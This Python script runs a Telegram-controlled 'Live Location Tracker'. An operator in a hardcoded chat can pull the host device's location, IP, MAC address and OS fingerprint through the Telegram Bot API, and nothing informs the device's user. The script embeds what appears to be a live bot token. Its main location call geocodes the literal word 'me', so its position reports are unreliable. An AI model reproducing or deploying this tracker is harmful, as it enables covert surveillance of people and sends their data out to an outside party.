import os
import sys
import time
import json
import requests
import threading
import uuid  # For MAC address
import platform  # For OS fingerprinting
from geopy.geocoders import Nominatim  # For geolocation
from geopy.exc import GeocoderTimedOut  # Handle geolocation errors

# Telegram Bot Token and Chat ID (replace with your bot token and chat ID)
TELEGRAM_BOT_TOKEN = "7986513852:AAEC7GW0NgerL7VsLFEbo89pMOI0Wya4BvY"
TELEGRAM_CHAT_ID = "6623647751"

# Telegram API URLs
TELEGRAM_API_URL_SEND_MESSAGE = f"https://api.telegram.org/bot7986513852:AAEC7GW0NgerL7VsLFEbo89pMOI0Wya4BvY/sendMessage"
TELEGRAM_API_URL_EDIT_MESSAGE = f"https://api.telegram.org/bot7986513852:AAEC7GW0NgerL7VsLFEbo89pMOI0Wya4BvY/editMessageText"
TELEGRAM_API_URL_GET_UPDATES = f"https://api.telegram.org/bot7986513852:AAEC7GW0NgerL7VsLFEbo89pMOI0Wya4BvY/getUpdates"
TELEGRAM_API_URL_SEND_LOCATION = f"https://api.telegram.org/bot7986513852:AAEC7GW0NgerL7VsLFEbo89pMOI0Wya4BvY/sendLocation"

# Global variable to control live location tracking
is_sending_location = False

# Function to send text data to Telegram
def send_to_telegram(message):
    try:
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message  # The message to send
        }
        headers = {
            "Content-Type": "application/json"
        }
        response = requests.post(TELEGRAM_API_URL_SEND_MESSAGE, data=json.dumps(payload), headers=headers, timeout=10)
        if response.status_code == 200:  # 200 means success in Telegram's API
            print("Data sent to Telegram successfully.")
        else:
            print(f"Failed to send data. Status code: {response.status_code}")
            print(f"Response: {response.text}")  # Print the full response for debugging
    except Exception as e:
        print(f"Error sending data to Telegram: {e}")

# Function to fetch location using IP-based geolocation (fallback)
def get_location_from_ip():
    try:
        response = requests.get("https://ipinfo.io/json", timeout=10)
        data = response.json()
        if "loc" in data:
            latitude, longitude = data["loc"].split(",")
            return float(latitude), float(longitude)
        else:
            send_to_telegram("Unable to fetch location from IP.")
            return None, None
    except Exception as e:
        send_to_telegram(f"Error fetching location from IP: {e}")
        return None, None

# Function to send live location to Telegram
def send_live_location():
    global is_sending_location
    is_sending_location = True
    geolocator = Nominatim(user_agent="live_location_tracker_bot")  # Unique user-agent
    while is_sending_location:
        try:
            # Try fetching location using Nominatim
            location = geolocator.geocode("me", timeout=10)  # Increased timeout
            if location:
                latitude = location.latitude
                longitude = location.longitude
            else:
                # Fallback to IP-based geolocation if Nominatim fails
                latitude, longitude = get_location_from_ip()
                if not latitude or not longitude:
                    send_to_telegram("Unable to fetch location.")
                    continue

            # Send the location to Telegram
            payload = {
                "chat_id": TELEGRAM_CHAT_ID,
                "latitude": latitude,
                "longitude": longitude
            }
            response = requests.post(TELEGRAM_API_URL_SEND_LOCATION, data=payload, timeout=10)
            if response.status_code == 200:
                print(f"Location sent successfully: Latitude={latitude}, Longitude={longitude}")
            else:
                print(f"Failed to send location. Status code: {response.status_code}")
                print(f"Response: {response.text}")
        except GeocoderTimedOut:
            send_to_telegram("Geolocation request timed out.")
        except Exception as e:
            send_to_telegram(f"Error fetching location: {e}")
        time.sleep(10)  # Ensure at least 10 seconds between requests

# Function to stop sending live location and show the menu again
def stop_sending_location():
    global is_sending_location
    is_sending_location = False
    send_to_telegram("Stopped sending live location.")
    send_menu(TELEGRAM_CHAT_ID)  # Show the menu again

# Function to get the device's IP address
def get_ip_address():
    try:
        response = requests.get("https://api64.ipify.org?format=json", timeout=10)
        data = response.json()
        ip_address = data.get("ip", "Unknown")
        send_to_telegram(f"Your IP Address: {ip_address}")
    except Exception as e:
        send_to_telegram(f"Error fetching IP address: {e}")

# Function to get the device's MAC address
def get_mac_address():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
        send_to_telegram(f"Your MAC Address: {mac}")
    except Exception as e:
        send_to_telegram(f"Error fetching MAC address: {e}")

# Function to perform OS fingerprinting
def get_os_info():
    try:
        os_info = {
            "System": platform.system(),
            "Node Name": platform.node(),
            "Release": platform.release(),
            "Version": platform.version(),
            "Machine": platform.machine(),
            "Processor": platform.processor()
        }
        os_details = "\n".join([f"{key}: {value}" for key, value in os_info.items()])
        send_to_telegram(f"OS Fingerprinting:\n{os_details}")
    except Exception as e:
        send_to_telegram(f"Error fetching OS information: {e}")

# Function to create and send the menu
def send_menu(chat_id, message_id=None):
    keyboard_markup = {
        "inline_keyboard": [
            [
                {"text": "Send Live Location", "callback_data": "start_location"},
                {"text": "Stop Location", "callback_data": "stop_location"}
            ],
            [
                {"text": "Get IP Address", "callback_data": "get_ip"},
                {"text": "Get MAC Address", "callback_data": "get_mac"}
            ],
            [
                {"text": "OS Fingerprinting", "callback_data": "get_os_info"}
            ]
        ]
    }
    payload = {
        "chat_id": chat_id,
        "text": "Live Location Tracker Menu:",
        "reply_markup": keyboard_markup
    }
    if message_id:
        # Edit the existing message if message_id is provided
        payload["message_id"] = message_id
        url = TELEGRAM_API_URL_EDIT_MESSAGE
    else:
        # Send a new message if no message_id is provided
        url = TELEGRAM_API_URL_SEND_MESSAGE
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
    if response.status_code != 200:
        print(f"Failed to send/edit menu. Status code: {response.status_code}")
        print(f"Response: {response.text}")

# Function to handle Telegram bot updates
def handle_updates():
    global is_sending_location
    last_update_id = None
    while True:
        try:
            # Fetch updates from Telegram
            params = {}
            if last_update_id:
                params["offset"] = last_update_id + 1
            response = requests.get(TELEGRAM_API_URL_GET_UPDATES, params=params, timeout=10)
            updates = response.json()
            if updates["ok"]:
                for update in updates["result"]:
                    last_update_id = update["update_id"]
                    # Handle callback queries (button presses)
                    if "callback_query" in update:
                        callback_query = update["callback_query"]
                        callback_data = callback_query["data"]
                        message = callback_query["message"]
                        chat_id = message["chat"]["id"]
                        message_id = message["message_id"]
                        if callback_data == "start_location":
                            threading.Thread(target=send_live_location).start()
                            send_menu(chat_id, message_id)
                            send_to_telegram("Started sending live location...")
                        elif callback_data == "stop_location":
                            stop_sending_location()
                        elif callback_data == "get_ip":
                            get_ip_address()
                        elif callback_data == "get_mac":
                            get_mac_address()
                        elif callback_data == "get_os_info":
                            get_os_info()
        except Exception as e:
            print(f"Error handling updates: {e}")
        time.sleep(1)

# Main function
def main():
    # Send the initial menu
    send_menu(TELEGRAM_CHAT_ID)
    # Start handling Telegram updates
    handle_updates()

if __name__ == "__main__":
    main()